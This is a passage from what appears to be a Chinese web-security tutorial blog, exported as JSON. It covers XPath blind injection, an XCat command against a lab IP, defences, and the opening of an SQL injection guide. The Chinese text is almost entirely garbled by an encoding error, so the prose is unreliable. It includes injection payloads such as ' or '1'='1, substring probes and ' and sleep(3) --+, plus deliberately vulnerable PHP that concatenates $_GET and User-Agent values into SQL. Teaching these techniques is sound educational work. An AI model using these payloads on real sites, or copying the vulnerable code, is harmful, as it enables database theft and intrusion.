IDï¼Œå°±ä¼šå¾—åˆ°ç›¸åº”çš„ç”¨æˆ·åã€‚å½“æŸ¥è¯¢è¯­å¥æ’æˆç«‹æ—¶ï¼ˆå¦‚æ„é€  Payload ä¸ºâ€™ or â€˜1â€™ = '1 æ—¶ï¼‰ï¼Œå°±ä¼šè¿”å›ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„ç”¨æˆ·å â€œAliceâ€ï¼ˆè¿™æ˜¯ç¨‹åºæœ¬èº«çš„ bug ï¼‰ã€‚è€Œå½“æŸ¥è¯¢è¯­å¥é”™è¯¯æˆ–è¯¥ ID åœ¨ xml æ•°æ®åº“ä¸­ä¸å­˜åœ¨æ—¶ï¼Œå°±ä»€ä¹ˆéƒ½ä¸è¿”å›ã€‚ åˆ©ç”¨è¿™ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ å¦‚ä¸‹ Payloadï¼Œæ¯”å¦‚ï¼šæ¥æŸ¥è¯¢æ•´ä¸ª xml æ–‡æ¡£çš„æ ¹èŠ‚ç‚¹çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯å¦ä¸ºâ€œuâ€ â€™ or substring(name(parent::*[position()=1]),1,1)='u è¿”å›ç»“æœä¸º â€œAliceâ€ï¼Œå°±è¯´æ˜æ•´ä¸ª xml æ–‡æ¡£çš„æ ¹èŠ‚ç‚¹çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ â€œuâ€ï¼Œåä¹‹å¦‚æœä»€ä¹ˆéƒ½æ²¡æœ‰è¿”å›ï¼Œåˆ™è¯´æ˜æ ¹èŠ‚ç‚¹çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸æ˜¯ â€œuâ€ã€‚ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†éæ•´ä¸ª xml æ–‡æ¡£äº†ã€‚è¿™ä¹Ÿæ˜¯ xmlå’Œå…¶ä»–æ•°æ®åº“ç›¸æ¯”æœ€å¤§çš„å¨èƒæ‰€åœ¨äº†ï¼Œå› ä¸ºå®ƒæ²¡æœ‰è®¿é—®æ§åˆ¶å’Œèº«ä»½éªŒè¯ã€‚ 0x15 xpathé˜²å¾¡ æ•°æ®æäº¤åˆ°æœåŠ¡å™¨ä¸Šç«¯ï¼Œåœ¨æœåŠ¡ç«¯æ­£å¼å¤„ç†è¿™æ‰¹æ•°æ®ä¹‹å‰ï¼Œå¯¹æäº¤æ•°æ®çš„åˆæ³•æ€§è¿›è¡ŒéªŒè¯ã€‚ æ£€æŸ¥æäº¤çš„æ•°æ®æ˜¯å¦åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç è½¬æ¢æˆ–æ›¿æ¢ã€åˆ é™¤æ•æ„Ÿå­—ç¬¦æˆ–å­—ç¬¦ä¸²ï¼Œå¦‚è¿‡æ»¤[] â€˜ â€œ and or ç­‰å…¨éƒ¨è¿‡æ»¤ï¼Œåƒå•åŒå¼•å·è¿™ç±»ï¼Œå¯ä»¥å¯¹è¿™ç±»ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç è½¬æ¢æˆ–æ›¿æ¢ å¯¹äºç³»ç»Ÿå‡ºç°çš„é”™è¯¯ä¿¡æ¯ï¼Œä»¥IEé”™è¯¯ç¼–ç ä¿¡æ¯æ›¿æ¢ï¼Œå±è”½ç³»ç»Ÿæœ¬èº«çš„å‡ºé”™ä¿¡æ¯æˆ–è€…ç”¨ç»Ÿä¸€çš„æŠ¥é”™é¡µé¢ä»£æ›¿ï¼ˆå¦‚updataxml()è¿™ç±»ï¼‰ å‚æ•°åŒ–XPathæŸ¥è¯¢ï¼Œå°†éœ€è¦æ„å»ºçš„XPathæŸ¥è¯¢è¡¨è¾¾å¼ï¼Œä»¥å˜é‡çš„å½¢å¼è¡¨ç¤ºï¼Œå˜é‡ä¸æ˜¯å¯ä»¥æ‰§è¡Œçš„è„šæœ¬ã€‚å¦‚ä¸‹ä»£ç å¯ä»¥é€šè¿‡åˆ›å»ºä¿å­˜æŸ¥è¯¢çš„å¤–éƒ¨æ–‡ä»¶ä½¿æŸ¥è¯¢å‚æ•°åŒ–ï¼š declare variable $loginID as xsï¼šstring externalï¼› declare variable $password as xsï¼šstring externalï¼› //users/user[@loginID=$loginID and@password= $password] é€šè¿‡MD5ã€SSLç­‰åŠ å¯†ç®—æ³•ï¼Œå¯¹äºæ•°æ®æ•æ„Ÿä¿¡æ¯å’Œåœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­åŠ å¯†ï¼Œå³ä½¿æŸäº›éæ³•ç”¨æˆ·é€šè¿‡éæ³•æ‰‹æ³•è·å–æ•°æ®åŒ…ï¼Œçœ‹åˆ°çš„ä¹Ÿæ˜¯åŠ å¯†åçš„ä¿¡æ¯ã€‚ éªŒè¯æ˜¯å¦åŒ…å«ç‰¹å®šçš„ XPath å‡½æ•°ï¼Œå¯ä»¥è¿‡æ»¤æ‰ä¸€äº› XPath å‡½æ•°ï¼Œä»¥æé«˜å®‰å…¨æ€§ï¼Œå½“ç„¶äº†ä¸èƒ½ä»¥ç‰ºç‰²ç”¨æˆ·ä½“éªŒæˆ–å½±å“ç”¨æˆ·æ­£å¸¸ä½¿ç”¨ä¸ºå‰æã€‚ æ€»ç»“ä¸‹å°±æ˜¯ï¼šé™åˆ¶æäº¤éæ³•å­—ç¬¦ï¼Œå¯¹è¾“å…¥å†…å®¹ä¸¥æ ¼æ£€æŸ¥è¿‡æ»¤ï¼Œå‚æ•°åŒ–XPathæŸ¥è¯¢çš„å˜é‡ 0x16 xpathå·¥å…· XCat XCatæ˜¯ä¸€ä¸ªç”¨æ¥åˆ©ç”¨XPathç›²æ³¨çš„å‘½ä»¤è¡Œç¨‹åºã€‚å®ƒå¯ä»¥ç”¨æ¥æ£€ç´¢æ­£åœ¨è¢«æ˜“å—æ”»å‡»çš„XPathæŸ¥è¯¢å¤„ç†çš„æ•´ä¸ªXMLæ–‡æ¡£ï¼Œè¯»å–ä¸»æœºæ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨æ— é™åˆ¶çš„HTTPè¯·æ±‚ä½¿æœåŠ¡å™¨ç›´æ¥å‘xcatå‘é€æ•°æ®(OOBå¸¦å¤–é€šä¿¡) Xcatæ˜¯pythonçš„å‘½ä»¤è¡Œç¨‹åºåˆ©ç”¨Xpathçš„æ³¨å…¥æ¼æ´åœ¨Webåº”ç”¨ä¸­æ£€ç´¢XMLæ–‡æ¡£,ä¸‹è½½åœ°å€ï¼šhttps://github.com/orf/xcat ä½¿ç”¨è¯´æ˜ï¼šhttp://xcat.readthedocs.io/en/latest/#about-xcat python3.4.1ç¯å¢ƒ: pip install xcat å¸¸ç”¨å‘½ä»¤è¯»å–xmlæ–‡ä»¶ï¼š(è¿™å‘½ä»¤è€äº†,æˆ‘ç°åœ¨ä¹Ÿä¸çŸ¥é“ç°ç‰ˆæœ¬å’‹ç”¨,æœ‰æ—¶é—´ç ”ç©¶å§â€¦) xcat.py --method=GET --public-ip=â€œ192.168.91.139â€ http://192 .168.91.139/xml/example2.php name=hacker name â€œHello hackerâ€ run retrieve Xpathæ³¨å…¥","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…æsqlæ³¨å…¥","path":"/2023/08/06/qian-xi-sql-zhu-ru/","content":"SQLæ³¨å…¥æ€»ç»“ sqlçš„æ³¨å…¥å¯ä»¥åˆ†ä¸ºæ•°å­—ç±»å‹ï¼Œå­—ç¬¦ç±»å‹ã€‚ æ–¹æ³•1ï¼š é¦–å…ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨(è½¬ä¹‰å­—ç¬¦)æ¥åˆ¤æ–­SQLæ³¨å…¥çš„é—­åˆæ–¹å¼ã€‚ åŸç†ï¼Œå½“é—­åˆå­—ç¬¦é‡åˆ°è½¬ä¹‰å­—ç¬¦æ—¶ï¼Œä¼šè¢«è½¬ä¹‰ï¼Œé‚£ä¹ˆæ²¡æœ‰é—­åˆç¬¦çš„è¯­å¥å°±ä¸å®Œæ•´äº†ï¼Œå°±ä¼šæŠ¥é”™ï¼Œé€šè¿‡æŠ¥é”™ä¿¡æ¯æˆ‘ä»¬å°±å¯ä»¥æ¨æ–­å‡ºé—­åˆç¬¦ã€‚ åˆ†ææŠ¥é”™ä¿¡æ¯ï¼šçœ‹\\æ–œæ åé¢è·Ÿç€çš„å­—ç¬¦ï¼Œæ˜¯ä»€ä¹ˆå­—ç¬¦ï¼Œå®ƒçš„é—­åˆå­—ç¬¦å°±æ˜¯ä»€ä¹ˆï¼Œè‹¥æ˜¯æ²¡æœ‰ï¼Œå°±ä¸ºæ•°å­—å‹ã€‚ æ–¹æ³•2ï¼š é¦–å…ˆå°è¯•ï¼š ?id=1â€™ ?id=1â€ ç»“æœä¸€ï¼šå¦‚æœéƒ½æŠ¥é”™ åˆ¤æ–­é—­åˆç¬¦ä¸ºï¼šæ•´å½¢é—­åˆã€‚ '1\"' ç»“æœäºŒï¼šå¦‚æœå•å¼•å·æŠ¥é”™ï¼ŒåŒå¼•å·ä¸æŠ¥é”™ã€‚ ç»§ç»­å°è¯• ?id=1â€™ â€“-+ ç»“æœ1ï¼šæ— æŠ¥é”™ åˆ¤æ–­é—­åˆç¬¦ä¸ºï¼šå•å¼•å·é—­åˆã€‚ ç»“æœ2ï¼šæŠ¥é”™ åˆ¤æ–­é—­åˆç¬¦å¯èƒ½ä¸ºï¼šå•å¼•å·åŠ æ‹¬å·ã€‚ ç»“æœä¸‰ï¼šå¦‚æœå•å¼•å·ä¸æŠ¥é”™ï¼ŒåŒå¼•å·æŠ¥é”™ã€‚ ç»§ç»­å°è¯• ?id=1\" -â€“+ ç»“æœ1ï¼šç»“æœæ— æŠ¥é”™ åˆ¤æ–­é—­åˆç¬¦ä¸ºï¼šåŒå¼•å·é—­åˆã€‚ ç»“æœ2ï¼šæŠ¥é”™ åˆ¤æ–­é—­åˆç¬¦å¯èƒ½ä¸ºï¼šåŒå¼•å·åŠ æ‹¬å·ã€‚ æ³¨æ„ï¼šè¿™é‡Œçš„æ‹¬å·ä¸ä¸€å®šåªæœ‰ä¸€ä¸ªï¼Œé—­åˆç¬¦é‡Œæ˜¯å…è®¸å¤šä¸ªæ‹¬å·ç»„åˆæˆé—­åˆç¬¦çš„ï¼Œå…·ä½“è¦åˆ¤æ–­æœ‰å¤šå°‘ä¸ªæ‹¬å·ï¼Œå¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•æ¥å¿«é€Ÿåˆ¤æ–­ã€‚ åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ é€šè¿‡\\ æˆ–è€… and1=1 and 1=2 and sleep(3) æŸ¥çœ‹é¡µé¢çŠ¶æ€ ä¹‹ç±»çš„å‡­æ„Ÿè§‰æ˜¯å¦æœ‰æ³¨å…¥ï¼Œæœ‰çš„è¯åˆ¤æ–­é—­åˆæ–¹å¼ åˆ¤æ–­é—­åˆæ–¹å¼ å¸¸è§„é—­åˆ' ') ')) \" \") \")) å¥‡è‘©é—­åˆæ–¹å¼ ä¸€ä¸ª) å’Œä¸¤ä¸ª )) é€šè¿‡and 1=1 å’Œand 1=2 æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œäº†æˆ‘ä»¬è¾“å…¥çš„è¯­å¥ é¶åœºç»éªŒï¼ˆæˆ‘ä¼šç»å¸¸é€šè¿‡ ' and sleep(3) --+ å»¶æ—¶åˆ¤æ–­æ¥é—­åˆï¼Œä¸ªäººä¹ æƒ¯ï¼Œç„¶åä¸€æ­¥ä¸€æ­¥æ‰¾é—­åˆæ–¹å¼ï¼Œåªè¦èƒ½é—­åˆæˆåŠŸï¼Œå…¶å®ƒéƒ½å¥½è¯´ï¼‰ 0x01 ä»€ä¹ˆæ˜¯SQLI æ‰€è°“SQLæ³¨å…¥å°±æ˜¯ç”¨æˆ·åœ¨èƒ½å¤Ÿæ§åˆ¶SQLæŸ¥è¯¢ã€æ›´æ–°ã€æ’å…¥ã€åˆ é™¤ç­‰è¯­å¥çš„å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¾“å…¥å­—ç¬¦ä¸²ä½¿åç«¯ç¨‹åºé”™è¯¯åœ°è¯†åˆ«SQLæŸ¥è¯¢è¯­å¥ä¸­çš„ä»£ç ä¸æ•°æ®éƒ¨åˆ†ä»è€Œå¯¼è‡´æ•°æ®åº“ç®¡ç†ç³»ç»Ÿè¾“å‡ºäº†éé¢„æœŸçš„ç»“æœçš„ä¸€ç§è¡Œä¸ºã€‚ SQLæ³¨å…¥æœ¬è´¨ä¸Šæ¥è®²å°±æ˜¯æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡è¾“å…¥é¢å¤–çš„ä¿¡æ¯ç ´åå¤–åç«¯è„šæœ¬åŸæœ‰çš„æŸ¥è¯¢è¯­å¥ç»“æ„ï¼Œä»è€Œè¾¾æˆæ³¨å…¥çš„ç›®çš„ã€‚ æ”»å‡»è€…æ„é€ çš„æŸ¥è¯¢å‚æ•°åœ¨SQLè¯­å¥ä¸­æ²¡æœ‰è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²å¯¹å¾…ï¼Œè€Œæ˜¯å…·æœ‰äº†å®é™…çš„åŠŸèƒ½ç‰¹æ€§ï¼Œè¿™æ˜¯PHPçš„è¯­æ³•å†³å®šçš„ï¼Œå®ƒåªæ˜¯ç®€å•åœ°å°†ç”¨æˆ·çš„è¾“å…¥ä¸åç«¯é¢„å®šä¹‰çš„è¯­å¥åšäº†ä¸€ä¸ªæ‹¼æ¥ï¼Œå°†æ‹¼æ¥çš„ç»“æœæ•´ä½“ä½œä¸ºä¸€æ¡SQLçš„æŸ¥è¯¢è¯­å¥ã€‚æ­£æ˜¯è¿™ä¸ªç‰¹æ€§å¯¼è‡´äº†SQLæ³¨å…¥çš„äº§ç”Ÿ. 0x02 sqlæ³¨å…¥çš„äº§ç”Ÿ æ³¨: webç¨‹åºç»“æ„ ä¸‰å±‚æ¶æ„(3-tier architecture) é€šå¸¸æ„ä¹‰ä¸Šå°±æ˜¯å°†æ•´ä¸ªä¸šåŠ¡åº”ç”¨åˆ’åˆ†ä¸ºï¼š ç•Œé¢å±‚ï¼ˆUser Interface layerï¼‰ ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆBusiness Logic Layerï¼‰ æ•°æ®è®¿é—®å±‚ï¼ˆData access layerï¼‰ ç”¨æˆ·èƒ½å¤Ÿç›´æ¥ä½¿ç”¨çš„éƒ½æ˜¯åœ¨è¡¨ç¤ºå±‚ï¼Œåœ¨è¡¨ç¤ºå±‚è¾“å…¥è‡ªå·±è¦è®¿é—®çš„å†…å®¹ï¼Œè¾“å…¥çš„å†…å®¹ä¼ é€’åˆ°ä¸šåŠ¡é€»è¾‘å±‚è¿›è¡Œå¤„ç†ï¼Œå¹¶å°†å¤„ç†åçš„æ•°æ®å†™å…¥åˆ°æ•°æ®åº“ä¸­ã€‚ åŒç†éœ€è¦è¯·æ±‚çš„å†…å®¹ä»æ•°æ®åº“ä¸­æŸ¥è¯¢å‡ºæ¥ååœ¨ä¸šåŠ¡é€»è¾‘å±‚è¿›è¡Œä¸šåŠ¡é€»è¾‘å¤„ç†ï¼Œä¹‹åå‘ˆç°åœ¨è¡¨ç¤ºå±‚ã€‚ ä»¥ä¸Šä¸¤æ­¥å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„è¯·æ±‚å’Œå“åº”è¿‡ç¨‹ã€‚ sqlæ³¨å…¥å°±æ˜¯å› ä¸ºä¸šåŠ¡é€»è¾‘å±‚æ²¡æœ‰åšå®‰å…¨è¿‡æ»¤ï¼Œåˆ°æ—¶äº†ä»è¡¨ç¤ºå±‚ä¼ é€’è¿‡æ¥çš„æ•°æ®ä¿®æ”¹äº†æ­£å¸¸çš„sqlè¯­å¥ç»“æ„ï¼Œä»è€Œè¾¾åˆ°äº†é»‘å®¢è‡ªèº«çš„æ”»å‡»ç›®çš„ã€‚ 2.1 å­—ç¬¦å‹æ³¨å…¥ å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åœ¨åç«¯ä»£ç ä¸­è¢«å¼•å·å¼•èµ·æ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç§°è¿™ç§æƒ…å†µä¸ºå­—ç¬¦å‹æ³¨å…¥ çœ‹ä¸‹é¢çš„ä¾‹å­ï¼ˆå­—ç¬¦å‹æ³¨å…¥ï¼‰ $query=\"select name,age,gender from t_students where id='{$_GET['id']}'\"; å­—ç¬¦å‹æ³¨å…¥æœ€å…³é”®çš„æ˜¯å¦‚ä½•é—­åˆSQLè¯­å¥ä»¥åŠæ³¨é‡Šå¤šä½™çš„ä»£ç ã€‚ æ³¨ï¼šæ•°æ®åº“ä¸åŒï¼Œå­—ç¬¦ä¸²è¿æ¥ç¬¦ä¸åŒï¼Œ SQL serverçš„è¿æ¥ç¬¦ä¸ºâ€œ+â€ï¼ŒOracleè¿æ¥ç¬¦ä¸ºâ€œ||â€ï¼ŒMySQLè¿æ¥ç¬¦ä¸ºç©ºæ ¼ 2.2 æ•°å­—å‹æ³¨å…¥ æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åœ¨åç«¯ä»£ç ä¸­æ²¡æœ‰è¢«å¼•èµ·æ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç§°è¿™ç§æƒ…å†µä¸ºæ•°å­—å‹æ³¨å…¥ã€‚å½“ç„¶ä¹‹åå‚æ•°ç±»å‹ä¸ºæ•°å­—çš„æ—¶å€™ï¼Œæ‰å­˜åœ¨åŒºåˆ†æ•°å­—å‹å’Œå­—ç¬¦å‹çš„æƒ…å†µ $query=\"select name,age,gender from t_students where id={$_GET['id']}\"; æ­¤æ—¶æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ç›´æ¥ä¸idè¿›è¡Œæ¯”è¾ƒ è¿›è¡Œsqlæ³¨å…¥çš„é¦–è¦æ“ä½œå°±æ˜¯å¯¹æ³¨å…¥ç±»å‹è¿›è¡Œåˆ¤æ–­ï¼Œå³å¯¹sqlè¯­å¥çš„é—­åˆæ–¹å¼è¿›è¡Œåˆ¤æ–­ 0x03 æŒ‰ç…§è¯·æ±‚æ–¹æ³•åˆ† 3.1 GETå‹æ³¨å…¥ æ‰€è°“GETå‹æ³¨å…¥ï¼Œé¡¾åæ€ä¹‰ï¼Œå³æ³¨å…¥ç‚¹çš„å‚æ•°æ˜¯åŒé€šè¿‡GETè¯·æ±‚å‘é€åˆ°åç«¯è¿›è¡Œå¤„ç†çš„ã€‚å…¶åˆå¯ä»¥åˆ†ä¸ºä¸‹é¢ä¸¤ç§æƒ…å½¢ï¼š 3.2 POSTå‹æ³¨å…¥ åŒç†POSTæ˜¯ä¸åŒäºGETçš„å¦ä¸€ç§ä¼ å‚æ–¹å¼ï¼Œå¤§å¤šå‡ºç°åœ¨å„ç§æ¡†å¤„ï¼Œæ¯”å¦‚ç™»å½•æ¡†ï¼ŒæŸ¥è¯¢æ¡†ï¼Œå’Œå„ç§ä¸æ•°æ®åº“æœ‰äº¤äº’çš„æ¡†ã€‚postæ³¨å…¥å’Œgetæ³¨å…¥åŸºæœ¬æ²¡æœ‰æœ¬è´¨çš„åŒºåˆ«ï¼Œé™¤äº†åœ¨å®½å­—èŠ‚æ³¨å…¥æ–¹é¢çš„æ“ä½œæœ‰æ‰€åŒºåˆ«ï¼ŒåŸºæœ¬æ“ä½œä¸€è‡´ã€‚ 3.3 urlæ³¨å…¥ å³æ³¨å…¥ç‚¹åœ¨urlä¸­ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œç°åœ¨æœ‰ä¸€ä¸ªç½‘é¡µï¼Œå®ç°äº†æ ¹æ®å­¦ç”Ÿå­¦å·ï¼Œæ¥æŸ¥è¯¢å­¦ç”ŸåŸºæœ¬ä¿¡æ¯çš„åŠŸèƒ½ï¼Œå­¦ç”Ÿçš„idä¿¡æ¯æ˜¯é€šè¿‡GETæ–¹æ³•ä¼ å‚å‘é€åˆ°åç«¯çš„ï¼Œå…¶è¯·æ±‚çš„urlå¦‚ä¸‹ http://www.armandhe.com/query.php?id=20140379 åå°å¤„ç†ä»£ç å¦‚ä¸‹ $query=\"select name,age,gender from t_students where id={$_GET['id']}\"; åœ¨è¯¥ä¾‹ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹urlä¸­çš„idå‚æ•°çš„å€¼ï¼Œæ¥æ§åˆ¶å‰ç«¯é¡µé¢çš„æ˜¾ç¤ºç»“æœã€‚å› ä¸ºæ²¡æœ‰è¿‡æ»¤çš„åŸå› ï¼Œæˆ‘ä»¬è¾“å…¥çš„ä»»ä½•å‚æ•°å€¼éƒ½å°†è¢«ç›´æ¥æ‹¼æ¥åˆ°SQLæŸ¥è¯¢è¯­å¥ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢æ³¨å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ã€‚ 3.4 è¯·æ±‚å¤´æ³¨å…¥ ç®€å•ç†è§£å°±æ˜¯æ³¨å…¥ç‚¹åœ¨è¯·æ±‚å¤´ä¸­ã€‚è¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­ï¼Œä¸è¿‡urlä¸­çš„å‚æ•°è¢«åç«¯è¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä¸å­˜åœ¨ä»»ä½•çš„æ³¨å…¥æ–¹æ³•ï¼Œä½†åç«¯åœ¨è¿›è¡Œå¤„ç†çš„æ—¶å€™ä¸ä»…ä»…æ˜¯ä½¿ç”¨äº†æŸ¥è¯¢è¯­å¥ï¼Œè¿˜å¯¹æˆ‘ä»¬è¯·æ±‚å¤´ä¸­çš„user-agentå­—æ®µåœ¨æ•°æ®åº“ä¸­è¿›è¡Œäº†æŸ¥è¯¢ï¼Œæ¥é˜²æ­¢æ¶æ„çˆ¬è™«ï¼Œä½†æ†¨æ†¨ç¨‹åºå‘˜å´æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¯·æ±‚å¤´åšè¿‡æ»¤ã€‚äºæ˜¯ä¹æˆ‘ä»¬å¯ä»¥åœ¨è¯·æ±‚å¤´ä¸­æ„é€ æ¶æ„ä»£ç ã€‚åŒç†ï¼Œä¸åªæ˜¯user-agentå­—æ®µï¼Œå…¶ä»–å­—æ®µåŒ…æ‹¬refererç­‰ï¼Œéƒ½å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼Œåç«¯å¤„ç†é€»è¾‘å¦‚ä¸‹ $link = @mysqli_connect($host,$username,$password,$dbname,$port); $userAgent=getallheaders()['User-Agent']; $query=\"select * from AgentJudge where userAgent='{$userAgent}'\"; $result=mysqli_query($link,$query); if (mysqli_num_rows($result)!=0){ print('è¯·ä¸è¦æ¶æ„æµè§ˆæœ¬ç½‘é¡µ'); } å¯ä»¥çœ‹åˆ°åç«¯ä»£ç ä¸­å¹¶æ²¡æœ‰å¯¹user-agentå­—æ®µåšè¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å¼€å§‹æ„é€ æ³¨å…¥è¯­å¥ 0x04 æŒ‰ç…§æœ‰æ— å›æ˜¾åˆ† 4.1 æ³¨å…¥æ­¥éª¤ åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨ é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ¤æ–­æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœåœ¨é¡µé¢çš„urlä¸­å­˜åœ¨æŸäº›å‚æ•°ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªURLä¸­å°±å­˜åœ¨ä¸€ä¸ªidå‚æ•°ï¼šhttp://xxxxx.xxx/?id=1 æˆ‘ä»¬å°±å¯ä»¥å°è¯•æ”¹å˜idçš„æ•°å€¼ï¼Œå°†å‚æ•°å€¼+1æˆ–-1ï¼Œç„¶åæŸ¥çœ‹é¡µé¢å±•ç¤ºçš„å†…å®¹æ˜¯å¦ä¼šå˜åŒ–ï¼Œå¦‚æœé¡µé¢ä¼šå‘ç”Ÿå˜åŒ–ï¼Œåˆ™æˆ‘ä»¬å°±å¯ä»¥åˆæ­¥åˆ¤æ–­ï¼Œè¿™ä¸ªidä¼šå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼ŒæŸ¥è¯¢åçš„å†…å®¹ä¼šæ˜¾ç¤ºåˆ°é¡µé¢ä¸­æ¥ã€‚ çŒœæµ‹æŸ¥è¯¢çš„SQLè¯­å¥å¤§è‡´ä¸ºï¼š select * from [è¡¨å] where id = 1; å¸¸è§æ³¨å…¥ç‚¹: 1.GET/POST/PUT/DELETEå‚æ•° 2.X-Forwarded-For 3.æ–‡ä»¶å æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæµ‹è¯•ï¼Œçœ‹çœ‹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¼šè¢«å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œæµ‹è¯•çš„æ–¹æ³•å¦‚ä¸‹ï¼š(è¿™é‡Œä¹Ÿç§°ä¸ºsqlè„±åº“å³æ‹¿å‡ºæ•°æ®åº“é‡Œé¢çš„æ•°æ®) æ·»åŠ å•å¼•å· æ·»åŠ äº†å•å¼•å·ä¹‹åï¼Œå¦‚æœé¡µé¢ä¸­ç›´æ¥è¿›è¡Œäº†æŠ¥é”™ï¼Œå¹¶ä¸”æŠ¥é”™çš„ä¿¡æ¯æ˜¾ç¤ºåˆ°äº†é¡µé¢ä¸­æ¥ï¼Œè¯´æ˜æˆ‘ä»¬è¾“å…¥çš„å•å¼•å·è¢«å¸¦å…¥äº†æ•°æ®åº“æŸ¥è¯¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åˆ¤æ–­æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚å¹¶ä¸”ç»“åˆä¹‹å‰åˆ¤æ–­çš„é¡µé¢æ˜¯å¦æœ‰å›æ˜¾ï¼Œå°±å¯ä»¥å°è¯•è¿›è¡Œè”åˆæŸ¥è¯¢æ³¨å…¥æˆ–æ˜¯æŠ¥é”™æ³¨å…¥ã€‚ æ·»åŠ é€»è¾‘è¿ç®— æ·»åŠ [and 1 = 1]å’Œ[and 1 = 2] åœ¨æ·»åŠ é€»è¾‘è¿ç®—ä¹‹å‰æˆ‘ä»¬éœ€è¦åˆ¤æ–­æˆ–è€…çŒœæµ‹æ³¨å…¥ç‚¹çš„æ•°æ®ç±»å‹å’Œé—­åˆæ–¹å¼ï¼Œå¹¶å¯¹è¯­å¥è¿›è¡Œç›¸åº”çš„å¼•å·ã€æ‹¬å·é—­åˆã€‚ æ¯”å¦‚å­—ç¬¦å‹æˆ‘ä»¬å¯ä»¥ç›´æ¥æ·»åŠ and 1=1 ï¼Œè€Œå•éªŒå·é—­åˆçš„å­—ç¬¦å‹æˆ‘ä»¬å°±éœ€è¦æ·»åŠ  'and '1'=1 ï¼Œæˆ– 'and '1'=1' # ä½¿ç”¨æ³¨é‡Šç¬¦å·å°†åé¢çš„å¼•å·ç›´æ¥æ³¨é‡Šæ‰ã€‚ æ·»åŠ äº†é€»è¾‘è¿ç®—ç¬¦ä¹‹åæäº¤ï¼Œå› ä¸º1=1æ’ä¸ºçœŸï¼Œè€Œ1=2æ’ä¸ºå‡ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬çš„è¾“å…¥å¸¦å…¥äº†æ•°æ®åº“ï¼Œä¸€å®šä¼šå½±å“åˆ°SQLè¯­å¥çš„å¸ƒå°”çŠ¶æ€ï¼Œå¦‚æœä¸¤æ¬¡æŸ¥è¯¢è¿”å›çš„é¡µé¢ä¸åŒï¼Œè¯´æ˜é¡µé¢å­˜åœ¨å¸ƒå°”çŠ¶æ€ï¼Œæ­¤å¤„å­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¸ƒå°”ç›²æ³¨è¿›è¡Œæ³¨å…¥ã€‚ æ·»åŠ sleep( )å‡½æ•° sleep()å‡½æ•°å¯ä»¥è®©ç¨‹åºåœ¨å½“å‰ä½ç½®åœç•™æŒ‡å®šçš„æ—¶é—´ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡è§‚å¯Ÿé¡µé¢ç›¸åº”çš„æ—¶é—´æ¥åˆ¤æ–­æˆ‘ä»¬æ’å…¥çš„å‚æ•°æ˜¯å¦ä¼šè¢«å¸¦å…¥æ•°æ®åº“æ‰§è¡Œã€‚ åœ¨å‚æ•°åæ·»åŠ  and sleep(5) ç„¶åè§‚å¯Ÿé¡µé¢å“åº”æ—¶é—´æ˜¯å¦æ˜æ˜¾å˜é•¿ï¼Œæˆ–ç›´æ¥åœ¨å¼€å‘è€…å·¥å…·ä¸­ç½‘ç»œé€‰é¡¹å¡ä¸‹è§‚å¯Ÿé¡µé¢çš„å“åº”æ—¶é—´ã€‚å¦‚æœé¡µé¢å“åº”æ—¶é—´ç¡®å®æŒ‰ç…§æˆ‘ä»¬çš„è¦æ±‚å¢åŠ 